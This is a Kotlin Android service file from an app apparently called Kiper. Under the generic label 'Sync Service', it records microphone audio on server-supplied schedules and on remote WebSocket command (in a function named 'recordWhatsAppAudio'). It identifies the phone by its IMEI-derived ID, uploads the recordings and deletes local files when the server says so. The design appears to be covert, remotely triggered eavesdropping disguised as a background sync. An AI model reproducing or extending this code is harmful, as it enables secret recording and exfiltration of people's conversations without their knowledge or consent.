package com.kiper.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.kiper.core.data.source.remote.WebSocketManager
import com.kiper.core.domain.model.AudioRecording
import com.kiper.core.domain.model.ScheduleResponse
import com.kiper.core.domain.model.WebSocketEventResponse
import com.kiper.core.domain.model.isIntoSchedule
import com.kiper.core.framework.worker.AudioRecordWorker
import com.kiper.core.util.parseTime
import com.kiper.core.util.timeString
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.launch
import java.io.File
import java.util.Calendar
import java.util.Date
import java.util.concurrent.TimeUnit
import javax.inject.Inject

@AndroidEntryPoint
class SyncService : Service() {

    @Inject
    lateinit var webSocketClient: WebSocketManager

    @Inject
    lateinit var workManager: WorkManager

    @Inject
    lateinit var syncViewModel: SyncViewModel

    private val job = Job()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    private var currentSchedules: List<ScheduleResponse> = emptyList()
    override fun onCreate() {
        super.onCreate()
        setUpObservers()
        startForeground(NOTIFICATION_ID, createNotification())
        initWebSocket()
        fetchDeviceSchedules()
    }

    private fun setUpObservers() {
        scope.launch {
            syncViewModel.recordings.collect { recordings ->
                recordings?.let {
                    var filePaths = emptyList<File>()
                    it.forEach { recording ->
                        filePaths = findFilesWithBaseName(
                            applicationContext.filesDir, recording.fileName
                        )
                    }
                    Log.i(TAG, "Recordings: $filePaths")
                    uploadAudioFiles(files = filePaths, eventType = EVENT_TYPE_PROCESS_AUDIO)
                }
            }
        }
        scope.launch {
            syncViewModel.fileDeleted.collect { fileName ->
                fileName?.let {
                    deleteFilesWithBaseName(it)
                }
            }
        }
        scope.launch {
            syncViewModel.schedules.collect { schedules ->
                schedules?.let { scheduleRecordings(it) }
            }
        }
        scope.launch {
            syncViewModel.uploadResult.collect { result ->
                if (result == true) {
                    fetchDeviceSchedules()
                }
            }
        }
        scope.launch {
            syncViewModel.isOutOfSchedule.collect { isOutOfSchedule ->
                isOutOfSchedule?.let {
                    if (it) {
                        getRecordingsForDay()
                    }
                }
            }
        }
    }

    private fun deleteFilesWithBaseName(baseName: String) {
        val directory = applicationContext.filesDir
        val matchingFiles = findFilesWithBaseName(directory, baseName)
        matchingFiles.forEach { file ->
            if (file.delete()) {
                println("Deleted file: ${file.name}")
            } else {
                println("Failed to delete file: ${file.name}")
            }
        }
    }

    private fun findFilesWithBaseName(directory: File, baseName: String): List<File> {
        return directory.listFiles { file ->
            file.isFile && file.name.startsWith(baseName)
        }?.toList() ?: emptyList()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun fetchDeviceSchedules() {
        val deviceId = getDeviceId()
        scope.launch {
            syncViewModel.fetchDeviceSchedules(deviceId)
        }
    }

    private fun initWebSocket() {
        webSocketClient.start(getDeviceId())
        webSocketClient.callback = object : WebSocketManager.WebSocketCallback {
            override fun onMessage(message: WebSocketEventResponse) {
                if (message.event == EVENT_TYPE_AUDIO) {
                    recordWhatsAppAudio()
                }
            }
        }
    }

    private fun recordWhatsAppAudio() {
        scope.launch {
            workManager.cancelAllWorkByTag(TAG_WORKER)
            workManager.cancelAllWorkByTag(TAG_FUTURE_WORKER)
            val now = Calendar.getInstance()
            val endTime = Calendar.getInstance().apply {
                add(Calendar.SECOND, 30)
            }
            val duration = endTime.timeInMillis - now.timeInMillis
            scheduleImmediateRecording(
                endTime = endTime,
                duration = duration,
                schedule = ScheduleResponse(now.timeString, endTime.timeString),
                tagWorker = TAG_WORKER,
                eventType = EVENT_TYPE_AUDIO
            )
            delay(duration + 4000L)
            val fileName = findFilesWithBaseName(
                applicationContext.filesDir,
                "${getDeviceId()}_${now.timeString}_${endTime.timeString}"
            ).firstOrNull()
            uploadAudioFiles(listOf(fileName), EVENT_TYPE_AUDIO)
        }
    }

    private fun getRecordingsForDay() {
        scope.launch {
            while (true) {
                delay((1_000_000L..1_200_000L).random())
                val isOutSchedule = currentSchedules.all { !it.isIntoSchedule() }
                println("Checking if out of schedule, list: $isOutSchedule")
                if (isOutSchedule) {
                    syncViewModel.getRecordingsForDay(startOfDay = Calendar.getInstance().apply {
                        set(Calendar.HOUR_OF_DAY, 0)
                        set(Calendar.MINUTE, 0)
                        set(Calendar.SECOND, 0)
                    }.timeInMillis, endOfDay = Calendar.getInstance().apply {
                        set(Calendar.HOUR_OF_DAY, 23)
                        set(Calendar.MINUTE, 59)
                        set(Calendar.SECOND, 59)
                    }.timeInMillis
                    )
                    println("Fetching recordings for the day")
                }
            }
        }
    }

    private fun uploadAudioFiles(files: List<File?>, eventType: String) {
        scope.launch {
            val deviceId = getDeviceId()
            Log.e(TAG, "$files")
            val filePaths = files.mapNotNull { it?.absolutePath }
            if (filePaths.isEmpty()) return@launch
            try {
                syncViewModel.uploadAudio(filePaths = filePaths,
                    deviceId = deviceId,
                    eventType = eventType,
                    fileNames = files.map { it?.name ?: "" })
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading audio files", e)
            }
        }
    }

    private fun scheduleRecordings(schedules: List<ScheduleResponse>) {
        currentSchedules = schedules
        val now = Calendar.getInstance()
        workManager.cancelAllWorkByTag(TAG_WORKER)
        schedules.forEach { schedule ->
            val startTime = schedule.startTime.parseTime
            val endTime = schedule.endTime.parseTime
            adjustToToday(startTime, endTime)
            Log.e(TAG, "Scheduling recording for ${schedule.startTime} to ${schedule.endTime}")
            Log.i(TAG, "Current time: ${now.after(startTime)} && ${now.before(endTime)}")
            val duration = endTime.timeInMillis - startTime.timeInMillis
            if (now.after(startTime) && now.before(endTime)) {
                scheduleImmediateRecording(
                    endTime = endTime,
                    duration = duration,
                    schedule = schedule,
                    tagWorker = TAG_WORKER,
                    eventType = EVENT_TYPE_PROCESS_AUDIO
                )
                Log.d(TAG, "Recording scheduled for ${schedule.startTime} to ${schedule.endTime}")
            } else if (now.before(startTime)) {
                scheduleFutureRecording(startTime, duration, schedule, TAG_WORKER)
                Log.d(TAG, "Recording scheduled for ${schedule.startTime} to ${schedule.endTime}")
            }
        }
        getRecordingsForDay()
    }

    private fun scheduleImmediateRecording(
        endTime: Calendar,
        duration: Long,
        schedule: ScheduleResponse,
        tagWorker: String,
        eventType: String,
    ) {
        val now = Calendar.getInstance()
        val remainingDuration = endTime.timeInMillis - now.timeInMillis
        scheduleRecording(
            delay = 0,
            duration = remainingDuration,
            schedule = schedule,
            tagWorker = tagWorker,
            eventType = eventType
        )
    }

    private fun scheduleFutureRecording(
        startTime: Calendar,
        duration: Long,
        schedule: ScheduleResponse,
        tagWorker: String,
        eventType: String = EVENT_TYPE_PROCESS_AUDIO,
    ) {
        val delay = startTime.timeInMillis - Calendar.getInstance().timeInMillis
        scheduleRecording(
            delay = delay,
            duration = duration,
            schedule = schedule,
            tagWorker = tagWorker,
            eventType = eventType
        )
    }

    private fun getAdjustDayToWork(startTime: Calendar, endTime: Calendar) {
        val now = Calendar.getInstance()
        if (now.after(endTime)) {
            adjustToTomorrow(startTime, endTime)
        } else {
            adjustToToday(startTime, endTime)
        }
    }

    private fun adjustToToday(startTime: Calendar, endTime: Calendar) {
        val today = Calendar.getInstance()
        startTime.set(Calendar.YEAR, today.get(Calendar.YEAR))
        startTime.set(Calendar.MONTH, today.get(Calendar.MONTH))
        startTime.set(Calendar.DAY_OF_MONTH, today.get(Calendar.DAY_OF_MONTH))

        endTime.set(Calendar.YEAR, today.get(Calendar.YEAR))
        endTime.set(Calendar.MONTH, today.get(Calendar.MONTH))
        endTime.set(Calendar.DAY_OF_MONTH, today.get(Calendar.DAY_OF_MONTH))
    }

    private fun adjustToTomorrow(startTime: Calendar, endTime: Calendar) {
        val tomorrow = Calendar.getInstance().apply {
            add(Calendar.DAY_OF_MONTH, 1)
        }
        startTime.set(Calendar.YEAR, tomorrow.get(Calendar.YEAR))
        startTime.set(Calendar.MONTH, tomorrow.get(Calendar.MONTH))
        startTime.set(Calendar.DAY_OF_MONTH, tomorrow.get(Calendar.DAY_OF_MONTH))

        endTime.set(Calendar.YEAR, tomorrow.get(Calendar.YEAR))
        endTime.set(Calendar.MONTH, tomorrow.get(Calendar.MONTH))
        endTime.set(Calendar.DAY_OF_MONTH, tomorrow.get(Calendar.DAY_OF_MONTH))
    }

    private fun scheduleRecording(
        delay: Long,
        duration: Long,
        schedule: ScheduleResponse,
        tagWorker: String,
        eventType: String,
    ) {

        val baseName =
            "${getDeviceId()}_${schedule.startTime}_${schedule.endTime}"
        val data = workDataOf(
            "recordingName" to baseName, "duration" to duration, "eventType" to eventType
        )
        println("Scheduling recording $baseName at ${System.currentTimeMillis() + delay}")
        val workRequest = OneTimeWorkRequestBuilder<AudioRecordWorker>().setInitialDelay(
            delay, TimeUnit.MILLISECONDS
        ).setInputData(data).addTag(tagWorker).build()

        syncViewModel.saveRecording(
            AudioRecording(
                fileName = baseName,
                filePath = applicationContext.filesDir.absolutePath,
                startTime = Date(),
                duration = duration
            )
        )

        workManager.enqueue(workRequest)
    }

    private fun getDeviceId(): String {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return telephonyManager.deviceId.substring(4, 14)
    }

    private fun createNotification(): Notification {
        val notification = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle("Sync Service")
            .setContentText("Running in the background")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE).build()

        val notificationManager =
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel =
                NotificationChannel(CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW)
            notificationManager.createNotificationChannel(channel)
        }
        return notification
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        webSocketClient.stop()
        Log.i(TAG, "Service destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG = "SyncService"
        private const val CHANNEL_ID = "sync_service_channel"
        private const val NOTIFICATION_ID = 1
        const val EVENT_TYPE_AUDIO = "audio"
        const val EVENT_TYPE_PROCESS_AUDIO = "ProcessAudio"
        private const val PERIODIC_TASK_DELAY = 10_000L // 10 seconds
        private const val DAY_IN_MILLIS = 86_400_000L // 1 day in milliseconds
        private const val INVALID_FILE_SIZE = 3.1513671875
        private const val TAG_WORKER = "AudioRecordWorker"
        private const val TAG_UPLOAD_WORKER = "AudioUploadWorker"
        private const val TAG_FUTURE_WORKER = "AudioFutureWorker"
    }
}
